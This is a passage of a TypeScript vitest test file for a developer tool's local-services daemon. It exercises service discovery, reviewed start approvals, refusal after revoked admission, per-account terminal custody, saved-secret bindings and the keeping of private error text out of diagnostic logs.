import axios from 'axios';
import { reconnectCliActionAutomationsV1 } from '@/api/actionAutomations';
import { AUTOMATION_ACTION_INDEX_HTTP_PATH_V1, ActionAutomationIndexV1Schema } from '@happier-dev/protocol/automations/automationActionTriggerV1';
import { logger } from '@/ui/logger';
import { encodePlainMachineStoredContent } from '@happier-dev/protocol/machines/machineStoredContent';
import { createServer } from 'node:net';
import { createHash } from 'node:crypto';
import { spawn, spawnSync } from 'node:child_process';
import { once } from 'node:events';
import nacl from 'tweetnacl';
import { bindExternalActionExecutionAuthorizationHttpPathV1, bindExternalActionExecutionAuthorizationVerifyHttpPathV1, ExternalActionExecutionAuthorizationVerifyRequestV1Schema, ExternalActionExecutionAuthorizationRequestV1Schema, ExternalActionExecutionAuthorizationV1Schema, ExternalActionMachineBootstrapV1Schema, ExternalActionRequestEnvelopeV1Schema, ExternalActionResponseEnvelopeV1Schema, type ExternalActionRequestEnvelopeV1 } from '@happier-dev/protocol/actions/externalActionApi';
import { computeExternalActionRequestEnvelopeDigestV1, signExternalActionApprovalInputV1 } from '@happier-dev/protocol/actions/externalActionExecutionAuthorization';
import { computeActionInputApprovalDigestV1 } from '@happier-dev/protocol/actions/decisionAuthority';
import { getActionSpec } from '@happier-dev/protocol/actions/actionSpecs';
import { admitRequesterAccountActionContext, prepareRequesterAccountActionContext } from '@/daemon/sessionEncryption/requesterAccountActionProjection';
import { createDaemonApprovalExecutionAuthorizationPreparer } from '@/daemon/externalActions/approvalExecutionAuthorization';
import { createRequesterCurrentnessSocketHarness } from '@/testkit/backends/requesterCurrentnessSocketHarness';
import { projectExternalActionRequesterHttpAuthorization } from '@/api/externalActionExecutionAuthorization';
import { executeExternalAction } from '@/daemon/externalActions/executeExternalAction';
import { openExternalActionRequesterAccountContextV1 } from '@happier-dev/protocol/sessions/creation/sessionRequesterBootstrapV1';
import * as filesystemBoundary from 'node:fs';
import { chmod, copyFile, cp, mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import * as filesystem from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { SpawnOptions } from 'node:child_process';
import { afterEach, describe, expect, it, onTestFinished, vi } from 'vitest';
import { createWorkspaceExecutionConfigClientV1 } from '@happier-dev/protocol/workspaces/workspaceExecutionConfigClientV1';
import { ProjectManifestV1Schema } from '@happier-dev/protocol/workspaces/projectSetup/projectManifestV1';
import type { RpcHandler, RpcHandlerContext } from '@/api/rpc/types';
import { registerMachineTerminalRpcHandlers } from '@/api/machine/rpcHandlers.terminal';
import { RPC_METHODS } from '@happier-dev/protocol/rpc/methods';
import { createHostActionOperationRuntime } from '@/daemon/actionOperations/createHostActionOperationRuntime';
import { createDaemonAdmissionDrain } from '@/daemon/lifecycle/admissionDrain';
import { createProjectWorkerAdmission } from '@/workspaces/execution/projectWorkerAdmission';
import { createTerminalPtySessionManager } from '@/terminal/pty/sessions';
import { createPythonPtyRelayProvider } from '@/terminal/pty/pythonRelay';
import type { PtyExitEvent, PtyProcess, PtySpawnParams } from '@/terminal/pty/provider';
import { createManagedServicesOwner } from '@/plugins/runtime/invocation/services/managedServicesOwner';
import { createProjectNativeToolchainIoForHost } from '@/plugins/runtime/invocation/services/exec';
import { createManagedServiceProcessSupervisorHost } from '@/plugins/runtime/invocation/services/managedProcessSupervisor';
import { MANAGED_SERVICE_NUMERIC_CONTRACT } from '@/plugins/runtime/invocation/services/managedServiceSpecNormalization';
import type { ProjectFiniteActionRuntime } from '@/workspaces/projectSetup/projectFiniteAction';
import { discoverLocalServiceRunTargets } from './runTargets';
import { createProjectServiceDeclarationStarter } from './projectDeclarations';
import { createLocalServicesDaemonRuntime } from '../runtime';
import { createLocalServiceLauncherFeed } from './feed';
import { createLocalServiceLauncherRoutes } from './routes';
import { createLocalServiceInventoryRegistry } from '../inventory/registry';
import { createLocalServicePreviewRegistry } from '../preview/registry';
import { createLocalServiceLauncherHistoryStore } from './leaves';
import { createLocalServiceActionRoutes } from '../actions/routes';
import { createLocalServicesDaemonRestartPreparation, createLocalServicesDaemonRuntimeActionExecutor } from '../actions/runtimeActionExecutor';
import { createProjectServiceRelocationRoute } from '../actions/projectServiceRelocationRoute';
import { createLocalServicesDaemonFeatureGate } from '../featureGate';
import { LocalServiceActionRequestV1Schema, LocalServiceActionResultV1Schema, LocalServiceManagedServiceActionTargetV1Schema, createLocalServiceActionConfirmationNonceV1, createProjectServiceDeclarationTargetIdV1 } from '@happier-dev/protocol/local/services/actions/v1';
import { computeWorkspaceSyncPolicyDigest, type WorkspaceSyncRelationshipV1 } from '@happier-dev/protocol';
import { PROJECT_ACCOUNT_ROWS_ROUTE_V1, type ProjectAccountRowV1 } from '@happier-dev/protocol/projects/projectAccountRowsV1';
import { ApiClient } from '@/api/api';
import { createMachineFinitePolicyClient } from '@/api/machine/machineFinitePolicy';
import { createProjectDefinitionAction, registerProjectDefinitionHandlers } from '@/rpc/handlers/projectDefinitions';
import { createProjectFiniteSourceManifestInspector } from '@/daemon/startup/createDaemonMachineBootstrapRuntime';
import { createWorkspaceSyncWorkerPreparation, prepareWorkspaceSyncBetween } from '@/workspaces/sync/workspaceSyncPreparation';
import type { WorkspaceSyncHandoffAdapter } from '@/workspaces/sync/workspaceSyncHandoffAdapter';
import { withdrawActiveProjectAccountRowsSnapshot } from '@/workspaces/projectAccountRows';
import { createActionExecutor, invokeHostReviewedChildV1 } from '@happier-dev/protocol/actions/actionExecutor';
import { ProjectDefinitionInspectOutputSchema } from '@happier-dev/protocol/actions/projectDefinitionActionFamily';
import { createUnavailableActionTransportDeps } from '@/testkit/actionTransportDeps';
import { normalizeActionsSettingsV1 } from '@happier-dev/protocol/actions/actionSettings';
import { createSnapshotActionSettingsProvider } from '@/settings/actionsSettingsProvider';
import { FeaturesResponseSchema } from '@happier-dev/protocol/features/payload/featuresResponseSchema';
import { RpcHandlerManager } from '@/api/rpc/RpcHandlerManager';
import { registerDaemonLocalServicesMachineRpcHandlers } from '@/rpc/handlers/daemonLocalServices';
import { registerActionSpecRpcHandlers } from '@/rpc/handlers/registerActionSpecRpcHandlers';
import { authorizeMachineRpcRequest } from '@/api/machine/machineRpcAuthorization';
import { DaemonLocalServiceLauncherSnapshotResponseV1Schema, DaemonLocalServiceLauncherStartResponseV1Schema, LocalServiceLauncherSnapshotV1Schema, LocalServiceStartApprovalReviewV1Schema } from '@happier-dev/protocol/local/services/launcher/v1';
import { createDefaultWorkspaceExecutionSettingsV1 } from '@happier-dev/protocol/workspaces/projectWorkerPreferencesV1';
import { createProcessActionOwnerAdapters } from '@/daemon/processes/actions/processActionOwnerAdapters';
import { MachineProcessesStartAgainResultV1Schema } from '@happier-dev/protocol/machines/processes/machineProcessesV1';
import { readProcessCensus } from '@/processes/census/processCensus';
import { listHappierProcessRoots } from '@/daemon/processes/roots/listHappierProcessRoots';
import type { ProjectServicePlacementV1 } from '@happier-dev/protocol/workspaces/projectServicePlacementV1';
import type { MachinePoolPrivateViewV1 } from '@happier-dev/protocol/machines/pools/v1';
import { createCliActionExecutorFromCredentials } from '@/session/actions/createCliActionExecutorFromCredentials';
import { createCliActionDeps } from '@/session/actions/createCliActionDeps';
import type { PluginApi, PluginInvocationContext, Disposable } from '@happier-dev/plugin-sdk';
import type { ManagedServiceNativeInstanceV1, ManagedServiceNativeLogReadV1, ManagedServiceNativeLogWatchV1, ManagedServiceNativeLogResultV1 } from '@happier-dev/plugin-sdk/managed-services';
import { createDaemonSpawnToolResolutionContext } from '@/daemon/spawnHooks';
import { readSupervisedPluginProcessIdForHost } from '@/plugins/runtime/exec/processSupervisor';
import { ingestCanonicalPluginManifest } from '@/plugins/manifest/ingest';
import { projectLoadedPluginContributes } from '@/plugins/projection/registry/fullProjection';
import { createResolvedContributionRegistry } from '@/plugins/projection/registry/createResolvedContributionRegistry';
import { activatePluginRuntimeRegistry } from '@/plugins/runtime/lifecycle/manager';
import { resolveProjectNativeAdapter } from '@/plugins/runtime/lifecycle/contributions/targetProjectNativeAdapters';
import { createPluginRuntimeOccurrenceId } from '@/plugins/runtime/runtimeSlots';
import { createPluginInvocationLifetime } from '@/plugins/runtime/invocation/lifetime';
import { createProductionPluginInvocationServiceOwners } from '@/plugins/runtime/invocation/services/production';
import { resolveManifestHostAccessRequestsForQualifiedContribution } from '@/plugins/runtime/hostAccess/manifestRequests';
import { pixiPlugin, pixiRuntime, pixiAdapter, importedPixiToolchain } from '../../../../../../../packages/plugin-sdk/fixtures/external-targeted-packages/project-native-source';
import * as processTreeBoundary from '@/processes/terminate/terminateProcessTree';
import { createEnvKeyScope } from '@/testkit/env/envScope';
import { withSocketTempDir } from '@/testkit/fs/tempDir';
import { reloadConfiguration } from '@/configuration';
import { updateSettings } from '@/persistence';
import { HomeConnectionDescriptorV1Schema } from '@happier-dev/protocol/auth/accountDirectory';
import { assertActionOutputContract, withActionOutputContract } from '@/testkit/actionOutputContract';
import { buildLocalServiceRows } from '../../../../../../../apps/ui/sources/sync/domains/local/services/serviceRow';
import { executeMachineActionAtDaemon } from '../../../../../../../apps/ui/sources/sync/ops/actions/executeMachineActionAtDaemon';
import { bindPresentUserActionConfirmation } from '../../../../../../../apps/ui/sources/sync/ops/actions/presentUserConfirmation';
import { createAccountServerActionDeps } from '@/api/accountServerActionDeps';
import { inspectProjectSetup } from '@/workspaces/projectSetup/projectSetupPreparation';
import { resolveProjectSetupAcceptedWorkspace } from '@/workspaces/projectSetup/projectSetupAcceptedWorkspace';
import { projectAccountRowsReadHttpResponse } from '@/workspaces/projectAccountRows.testkit';
import { WorkspaceExecutionConfigMutationRequestV1Schema, type WorkspaceExecutionConfigContentV1 } from '@happier-dev/protocol/workspaces/workspaceExecutionConfigRowV1';
import type { LocalServicesRuntimeActionRoutes } from '../actions/runtimeActionExecutor';
import { createCliActionExecutor } from '@/session/actions/createCliActionExecutor';
import { createProjectWorkerAction } from '@/workspaces/execution/projectWorkerAction';
import * as machineRpcBoundary from '@/session/transport/rpc/machineRpc';
import { readCarrierMutation } from '@/api/artifacts/accountArtifactStore.testkit';
import { ArtifactReadBatchHttpInputV1Schema, ArtifactReadHeadersBatchResponseV1Schema, ArtifactReadBatchResponseV1Schema } from '@happier-dev/protocol/artifacts/artifactAccessV1';
import { createCliApprovalsArtifactStore } from '@/session/actions/approvals/artifactStore';
import { ApprovalRequestV2Schema } from '@happier-dev/protocol/approvals/approvalRequestV1';
import { createTargetedActionRpcRequestV1, TargetedActionRpcRequestV1Schema } from '@happier-dev/protocol/actions/actionRpcTransport';
import { ACTION_OPERATION_REQUEST_ID_MAX_LENGTH_V1, ActionOperationSnapshotV1Schema, projectActionOperationSnapshotForV1Reader, type ActionOperationSnapshotV1 } from '@happier-dev/protocol/actions/operations/v1';
import { ActionOperationSnapshotV1Schema as PredecessorOperationSchema } from '@/daemon/actionOperations/testFixtures/predecessorActionOperationV1';
import { selectHostRequesterExecutionIdentity } from '@/daemon/agentIsolation/agentIsolationLaunchPolicy';
import { withSavedSecretMaterializer } from '@/settings/secrets/savedSecretCatalog.testkit';
import { projectSharedSetupDigestV1 } from '@happier-dev/protocol/projects/projectSetupV1';
import { ARTIFACT_PLAIN_DATA_KEY_MARKER, encodePlainArtifactStoredContent } from '@happier-dev/protocol/storage/artifactStoredContent';
import { workspaceCheckoutNativeBoundary } from '@/workspaces/activation/workspaceCheckoutNative.testkit';
import { runWorkspaceEffectWorker } from '@/workspaces/activation/workspaceEffectWorker';
import { readAgentLaunchFrame } from '@/daemon/agentIsolation/agentLaunchFrame';
import { deriveAgentIsolationMemberIdentity } from '@/daemon/agentIsolation/provisioning';
import { prepareRequesterNativeOperation } from '@/daemon/agentIsolation/prepareNativeOperation';

// Separate-users cases replace only OS permissions and the sudo member launch. Outside
// those cases every adapter passes through; beneath them the framed member Workspace
// worker, its read port and the canonical Project review stay real.
vi.mock('node:fs/promises', async importOriginal => {
    const actual = await importOriginal<typeof import('node:fs/promises')>();
    const { workspaceCheckoutFilesystemBoundary } = await import('@/workspaces/activation/workspaceCheckoutNative.testkit');
    return workspaceCheckoutFilesystemBoundary(actual);
});
vi.mock('fs/promises', async importOriginal => {
    const actual = await importOriginal<typeof import('fs/promises')>();
    const { workspaceCheckoutFilesystemBoundary } = await import('@/workspaces/activation/workspaceCheckoutNative.testkit');
    return workspaceCheckoutFilesystemBoundary(actual);
});
vi.mock('node:child_process', async importOriginal => {
    const actual = await importOriginal<typeof import('node:child_process')>();
    const { spawnWorkspaceCheckoutNativeBoundary } = await import('@/workspaces/activation/workspaceCheckoutNative.testkit');
    return { ...actual, spawn: ((...input: Parameters<typeof actual.spawn>) => Array.isArray(input[1]) && input[1].at(-1) === 'agent-launch'
        ? spawnWorkspaceCheckoutNativeBoundary(actual.spawn, (input[2] ?? {}) as SpawnOptions)
        : Reflect.apply(actual.spawn, actual, input)) as typeof actual.spawn };
});
vi.mock('@happier-dev/cli-common/process', async importOriginal => {
    const actual = await importOriginal<typeof import('@happier-dev/cli-common/process')>();
    return { ...actual, execFileWithDeadline: async (...input: Parameters<typeof actual.execFileWithDeadline>) => {
        if (!input[2]?.inputBytes || input[1]?.at(-1) !== 'agent-launch') return actual.execFileWithDeadline(...input);
        const { runWorkspaceCheckoutCwdBoundary, workspaceCheckoutNativeBoundary: boundary } = await import('@/workspaces/activation/workspaceCheckoutNative.testkit');
        const cwd = await runWorkspaceCheckoutCwdBoundary(input[2].inputBytes, input[2].signal);
        if (cwd) return cwd;
        boundary.phases.push('native_retired');
        return { stdout: '', stderr: '' };
    } };
});

class ObservedSetupPty implements PtyProcess {
    constructor(private readonly observed?: () => void) {}
    readonly pid = 3456;
    readonly ownedProcessGroupId = 3456;
    private readonly exits = new Set<(event: PtyExitEvent) => void>();
    write() {}
    resize() {}
    kill() {}
    onData() { return { dispose() {} }; }
    onExit(listener: (event: PtyExitEvent) => void) { this.exits.add(listener); this.observed?.(); return { dispose: () => this.exits.delete(listener) }; }
    exit(exitCode: number) { for (const listener of this.exits) listener({ exitCode, signal: 0 }); }
}

describe('accepted Project Service declaration starter', () => {
    it('retains Move observation transport failure causes before any effect', async () => {
        const f = await fixture();
        const move = createProjectServiceRelocationRoute({ serverBaseUrl: 'https://home.example',
            credentials: f.runtime.credentials!, projectManagedServices: f.owner, resolveWorkspaceSyncHandoffAdapter: () => null });
        const executor = createCliActionExecutor({ token: f.runtime.credentials!.token, credentials: f.runtime.credentials!,
            serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null });
        f.post.mockRejectedValue(Object.assign(new Error('private Move transport failure'), { code: 'ECONNREFUSED' }));
        const diagnostic = vi.spyOn(logger, 'warnLocalFile').mockImplementation(() => {});
        const workspace = { serverId: f.workspace.serverId, refId: f.workspace.id };
        const destination = { kind: 'workers' as const, destination: { kind: 'machine' as const, machineId: 'other-machine' } };
        expect(await move({ workspace, sourceMachineId: f.workspace.machineId, serviceName: 'worker', requestId: 'move-observation-failure',
            currentTarget: { kind: 'managed_service', managedServiceId: 'missing-native-service', machineId: f.workspace.machineId,
                workspaceId: f.workspace.id, cwd: f.root, declaration: f.request.declaration }, destination,
            selectedTarget: { machineId: 'other-machine' }, desiredPlacement: { workspace, serviceName: 'worker',
                expectedRevision: 'absent', expected: { kind: 'absent' }, value: { runsOn: destination, unavailable: 'fail' } } },
        f.context, (action, input) => executor.execute(action, input, f.context), f.ingress))
            .toMatchObject({ ok: false, errorCode: 'service_observation_unavailable' });
        expect(diagnostic).toHaveBeenCalledWith(expect.any(String), expect.objectContaining({
            phase: 'local_service.move.observe', errorClass: 'Error',
        }));
        expect(JSON.stringify(diagnostic.mock.calls)).not.toContain('private Move transport failure');
        expect(f.owner.listProjectServices()).toEqual([]);
    });

    it('retains launcher Start failure causes when operation identity randomness fails before the effect', async () => {
        const h = await fixture();
        // Randomness is the operation owner's genuine OS boundary; admission and launch stay real.
        Object.assign(h.runtime, { operationRuntime: createHostActionOperationRuntime({ machineId: h.workspace.machineId,
            resolveAccountId: async () => 'owner', generateOperationId: () => {
                throw Object.assign(new Error('private Start failure'), { code: 'EIO' });
            } }) });
        const review = await h.selectStart();
        const diagnostic = vi.spyOn(logger, 'warnLocalFile').mockImplementation(() => {});
        try {
            expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
                .toMatchObject({ status: 'failed', reasonCode: 'managed_start_failed' });
            expect(diagnostic).toHaveBeenCalledWith(expect.any(String), expect.objectContaining({
                phase: 'local_service.start', errorClass: 'Error', errorCode: 'EIO',
            }));
            expect(JSON.stringify(diagnostic.mock.calls)).not.toContain('private Start failure');
        } finally { diagnostic.mockRestore(); }
    });

    it.skipIf(process.platform === 'win32')('keeps launching Account service terminal custody on the daemon profile across a portable Home', async () => {
        const h = await fixture(false, undefined, true, undefined, 'private-service-profile', 'srv_serviceHome', undefined, undefined, false, true);
        const runtime = { ...h.runtime, terminalSessions: h.terminalSessions, operationRuntime: h.operationRuntime };
        const handlers = new Map<string, RpcHandler>();
        const registration = registerMachineTerminalRpcHandlers({
            rpcHandlerManager: { registerHandler(method, handler) { handlers.set(method, handler); } },
            deps: { serverId: h.runtime.serverId, resolveHostHomeServerIdentityId: async () => h.serverIdentityId,
                env: {}, workingDirectory: h.root, sessionManager: h.terminalSessions,
                accountReadRuntime: async () => runtime, projectFiniteRuntime: async () => runtime },
        });
        try {
            // Control: the same admitted Account can read an ordinary Project shell.
            const shell = await handlers.get(RPC_METHODS.DAEMON_TERMINAL_ENSURE)!({ terminalKey: 'control', workspace: h.request.workspace }, h.ingress);
            expect(shell).toMatchObject({ ok: true, terminalId: expect.any(String) });
            if (!shell || typeof shell !== 'object' || !('terminalId' in shell)) throw new Error('Project control terminal missing');
            await expect(handlers.get(RPC_METHODS.DAEMON_TERMINAL_STREAM_READ_BYTES)!({ terminalId: shell.terminalId, byteOffset: 0 }, h.ingress))
                .resolves.toMatchObject({ ok: true });
            const review = await h.selectStart();
            const startRequest = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
            const started = await h.routes.startTarget!(startRequest, h.ingress, h.context);
            expect(started, JSON.stringify(started)).toMatchObject({ status: 'succeeded' });
            const service = h.owner.listProjectServices()[0]!;
            const terminalId = service.terminalView?.terminalId;
            expect(terminalId).toEqual(expect.any(String));
            expect(started).toMatchObject({ terminalView: service.terminalView });
            const replayed = await h.routes.startTarget!(startRequest, h.ingress, h.context);
            expect(replayed).toMatchObject({ status: 'succeeded', terminalView: service.terminalView });
            expect(h.owner.listProjectServices()).toEqual([service]);
            const read = { terminalId, byteOffset: 0 };
            const interrupt = { terminalId, event: { t: 'key', key: 'c', modifiers: ['ctrl'] } };
            // Manage permission does not grant another Account this retained terminal.
            const foreign = { ...h.ingress, machineAdmission: { ...h.ingress.machineAdmission!, actorAccountId: 'other-account' } };
            await expect(handlers.get(RPC_METHODS.DAEMON_TERMINAL_STREAM_READ_BYTES)!(read, foreign))
                .resolves.toMatchObject({ ok: false, code: 'terminal_forbidden' });
            await expect(handlers.get(RPC_METHODS.DAEMON_TERMINAL_STREAM_INPUT)!(interrupt, foreign))
                .resolves.toMatchObject({ ok: false, code: 'terminal_forbidden' });
            await expect.soft(handlers.get(RPC_METHODS.DAEMON_TERMINAL_STREAM_READ_BYTES)!(read, h.ingress))
                .resolves.toMatchObject({ ok: true });
            await expect.soft(handlers.get(RPC_METHODS.DAEMON_TERMINAL_STREAM_INPUT)!(interrupt, h.ingress))
                .resolves.toEqual({ ok: true });
            expect(h.terminalSessions.getCustody(terminalId!)).toMatchObject({ serverId: h.runtime.serverId,
                requesterAccountId: 'owner', machineId: 'machine', installationId: 'installation' });
            await expect.poll(() => service.snapshot().state).toBe('stopped');
        } finally {
            try { await Promise.all(h.owner.listProjectServices().map(service => service.stop())); }
            finally { registration.dispose(); }
        }
    });
    it('discovers, reviews and starts an accepted shared-only Service without a repository manifest', async () => {
        const h = await fixture(false, undefined, true, undefined, 'home', 'home', undefined, undefined, true);
        const discovered = await discoverLocalServiceRunTargets({ roots: [], acceptedWorkspaceRefs: [h.workspace],
            projectDefinitionAccount: { account: { credentials: h.runtime.credentials }, serverHttpBaseUrl: h.runtime.serverHttpBaseUrl } });
        expect(discovered.targets).toMatchObject([{ declaration: { selection: { kind: 'manifest', name: 'worker' } } }]);
        const snapshot = await h.routes.getSnapshot({ workspaceRoot: h.root });
        expect(snapshot.targets.some(target => target.id === h.request.targetId)).toBe(true);
        const review = await h.selectStart();
        expect(review.reviewedEffectDigest).toEqual(expect.any(String));
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        expect(h.owner.listProjectServices()[0]?.snapshot().state).toBe('running');
        expect(h.setupProcesses).toEqual([]);
        await h.owner.listProjectServices()[0]?.stop();
    });
    it('publishes reviewed Start for a declaration with retained stopped history and starts it again', async () => {
        const h = await fixture(false, undefined, true, undefined, 'home', 'home', undefined, undefined, false, false, true);
        const first = (await h.routes.getSnapshot()).targets.find(target => target.id === h.request.targetId)!;
        const review = await h.selectStart();
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        const original = h.owner.listProjectServices()[0]!;
        await original.stop();
        const retained = (await h.routes.getSnapshot()).targets.find(target => target.id === first.id)!;
        expect(retained).toMatchObject({ sourceClass: { kind: 'managed_service', managedServiceId: original.instanceId },
            serviceState: 'stopped', workspace: first.workspace, declaration: first.declaration });
        expect(retained.actions).toContain('start');
        expect(first.actions).toContain('start');
        const request = { machineId: retained.machineId!, targetId: retained.id, workspace: retained.workspace!, declaration: retained.declaration! };
        const nextReview = await h.starter.resolveStartTarget(request, h.ingress, h.context);
        if (!nextReview.ok) throw new Error(nextReview.reasonCode);
        expect(await h.routes.startTarget!({ ...request, expectedEffectDigest: nextReview.declaration.reviewedEffectDigest }, h.ingress,
            { ...h.context, actionRequestId: 'retained-history-start' })).toMatchObject({ status: 'succeeded' });
        await h.owner.listProjectServices().find(handle => handle.snapshot().state === 'running')?.stop();
        await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...h.manifest, services: {} }));
        await h.refreshDiscovery();
        const history = (await h.routes.getSnapshot()).targets.find(target => target.id === first.id)!;
        expect(history.serviceState).toBe('stopped');
        expect(history.actions).not.toContain('start');
    });

    it('starts the same declaration again after its original process is stopped', async () => {
        const h = await fixture();
        const review = await h.selectStart();
        const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
        expect(await h.routes.startTarget!(request, h.ingress, h.context)).toMatchObject({ status: 'succeeded' });
        const original = h.owner.listProjectServices()[0]!;
        const actions = createLocalServiceActionRoutes({ machineId: 'machine', projectManagedServices: h.owner,
            inventoryRegistry: createLocalServiceInventoryRegistry(),
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const stop = { requestId: 'stop-before-start', action: 'stop_managed' as const, force: false,
            target: { kind: 'managed_service' as const, machineId: 'machine', managedServiceId: original.instanceId,
                workspaceId: h.workspace.id, declaration: h.request.declaration, cwd: h.root } };
        expect(await actions.execute({ ...stop, confirmationNonce: createLocalServiceActionConfirmationNonceV1(stop) },
            { ingress: h.ingress, actionContext: h.context })).toMatchObject({ status: 'succeeded' });
        expect(original.snapshot().state).toBe('stopped');
        const restarted = await h.routes.startTarget!(request, h.ingress,
            { ...h.context, actionRequestId: 'start-after-stop' });
        expect(restarted).toMatchObject({ status: 'succeeded' });
        expect(h.owner.listProjectServices().some(service => service.snapshot().state === 'running')).toBe(true);
    });

    it('starts with required Project Saved Secret bindings', async () => {
        const h = await fixture();
        const marker = join(h.targetRoot, 'secret-matched');
        const digest = createHash('sha256').update('service-secret-fixture').digest('hex');
        const script = `if (require('node:crypto').createHash('sha256').update(process.env.PROJECT_TOKEN ?? '').digest('hex') !== ${JSON.stringify(digest)}) process.exit(23); require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'matched'); setInterval(() => {}, 1000);`;
        await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...h.manifest,
            environmentVariables: [{ name: 'PROJECT_TOKEN', kind: 'secret', required: true }],
            services: { worker: { ...h.manifest.services!.worker,
                source: { kind: 'command', command: `${JSON.stringify(process.execPath)} -e ${JSON.stringify(script)}` } } },
        }));
        h.runtime.secretEnvironment = withSavedSecretMaterializer({ accountSettings: {
            secrets: [{ id: 'service-token', encryptedValue: { _isSecretValue: true, value: 'service-secret-fixture' } }],
        }, settingsSecretsReadKeys: [] });
        const key = { kind: 'project-organization' as const, serverId: 'home', projectKey: 'project' };
        const row: ProjectAccountRowV1 = { key, revision: 0, content: { t: 'plain', v: { key, value: {
            environmentBindings: { v: 1, bindings: { PROJECT_TOKEN: { ref: 'service-token' } } },
        } } } };
        const post = h.post.getMockImplementation()!;
        h.post.mockImplementation(async (url, body, options) => {
            if (body && typeof body === 'object' && 'key' in body && JSON.stringify(body.key) === JSON.stringify(key)) {
                return projectAccountRowsReadHttpResponse([row], String(url), body);
            }
            return post(url, body, options);
        });
        const review = await h.selectStart();
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        await vi.waitFor(async () => expect(await readFile(marker, 'utf8')).toBe('matched'));
        await h.owner.listProjectServices()[0]!.stop();
    });

    it('finishes an admitted setup review and refuses the next request after revocation', async () => {
        const h = await fixture(true);
        let current = true;
        const post = h.post.getMockImplementation()!;
        h.post.mockImplementation(async (url, body, options) => {
            const response = await post(url, body, options);
            if (String(url).endsWith('/project-trust/read')) current = false;
            return response;
        });
        const result = await h.starter.resolveStartTarget(h.request,
            { ...h.ingress, verifyMachineAdmissionCurrent: async () => current }, h.context);
        expect(current).toBe(false);
        expect(result).toMatchObject({ ok: false, reasonCode: 'project_setup_consent_required', reviewedEffectDigest: expect.any(String) });
        expect(await h.starter.resolveStartTarget(h.request,
            { ...h.ingress, verifyMachineAdmissionCurrent: async () => current }, h.context))
            .toEqual({ ok: false, reasonCode: 'machine_admission_changed', failureCause: {
                phase: 'service.launch.supervision', errorClass: 'Error', errorCode: 'machine_admission_changed', httpStatus: null,
            } });
        expect(h.setupProcesses).toEqual([]);
    });

    it('admits approval and Start once each without repeating authority across passive or causal effect reads', async () => {
        const h = await fixture(true, undefined, true, 'portable');
        // A retained destination permits passive approval; Start must still copy anew.
        await cp(h.root, h.targetRoot, { recursive: true });
        let admissions = 0;
        let requesterChecks = 0;
        let inspections = 0;
        let current = true;
        Object.assign(h.runtime, { isCurrent: async () => { requesterChecks++; return current; } });
        const delay = () => new Promise<void>(resolve => setTimeout(resolve, 20));
        const post = h.post.getMockImplementation()!;
        h.post.mockImplementation(async (url, body, options) => {
            if (String(url).endsWith('/v1/actions/projects.inspect')) { inspections++; await delay(); }
            return post(url, body, options);
        });
        const ingress = { ...h.ingress, verifyMachineAdmissionCurrent: async () => { admissions++; await delay(); return true; } };
        const approval = await h.starter.prepareStartApproval(h.request, ingress, h.context);
        if ('ok' in approval) throw new Error(approval.errorCode);
        expect(admissions).toBe(1);
        expect(requesterChecks).toBe(1);
        expect(inspections).toBe(1);
        h.trustSetupDigest(approval.setup!.reviewedEffectDigest);
        const context = { ...h.context, nativeServiceStartApproval: approval };
        const selected = await h.starter.resolveStartTarget(h.request, ingress, context);
        if (!selected.ok) throw new Error(selected.reasonCode);
        expect(admissions).toBe(2);
        expect(requesterChecks).toBe(2);
        expect(inspections).toBe(2);
        const completion = h.starter.startManagedDeclaration(selected.declaration, h.request, ingress, context);
        await Promise.race([h.setupStarted, completion]);
        current = false;
        h.setupProcesses[0]?.pty.exit(0);
        expect(await completion).toMatchObject({ status: 'succeeded' });
        // Approval and Start are separate requests. Copy/setup/native preparation
        // still review actual effect changes, without repeating their admission.
        expect(admissions).toBe(2);
        expect(requesterChecks).toBe(2);
        expect(inspections).toBe(2);
        console.info('Project Service admission shape', { requests: 2, admissions, requesterChecks, inspections });
        expect(await h.starter.resolveStartTarget(h.request, ingress, context))
            .toMatchObject({ ok: false, reasonCode: 'project_requester_credentials_unavailable' });
        await h.owner.listProjectServices()[0]?.stop();
    });

    it.each(['approval', 'start'] as const)('refuses revoked authority before %s admission', async boundary => {
        const h = await fixture(true, undefined, true, 'portable');
        await cp(h.root, h.targetRoot, { recursive: true });
        const ingress = { ...h.ingress, verifyMachineAdmissionCurrent: async () => false };
        if (boundary === 'approval') {
            expect(await h.starter.prepareStartApproval(h.request, ingress, h.context))
                .toMatchObject({ ok: false, errorCode: 'machine_admission_changed',
                    failureCause: { phase: 'service.launch.supervision', errorCode: 'machine_admission_changed' } });
        } else {
            expect(await h.starter.resolveStartTarget(h.request, ingress, h.context))
                .toMatchObject({ ok: false, reasonCode: 'machine_admission_changed' });
        }
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.each(['source_before_copy', 'destination_after_copy', 'setup_inputs', 'placement'] as const)(
        'refuses changed %s in a reviewed worker Start', async scenario => {
        const h = await fixture(true, undefined, true, 'portable');
        await cp(h.root, h.targetRoot, { recursive: true });
        const approval = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
        if ('ok' in approval) throw new Error(approval.errorCode);
        h.trustSetupDigest(approval.setup!.reviewedEffectDigest);
        const context = { ...h.context, nativeServiceStartApproval: approval };
        const selected = await h.starter.resolveStartTarget(h.request, h.ingress, context);
        if (!selected.ok) throw new Error(selected.reasonCode);
        const changed = { ...h.manifest, services: { worker: { ...h.manifest.services!.worker,
            source: { kind: 'command', command: 'echo unapproved' } } } };
        if (scenario === 'source_before_copy') {
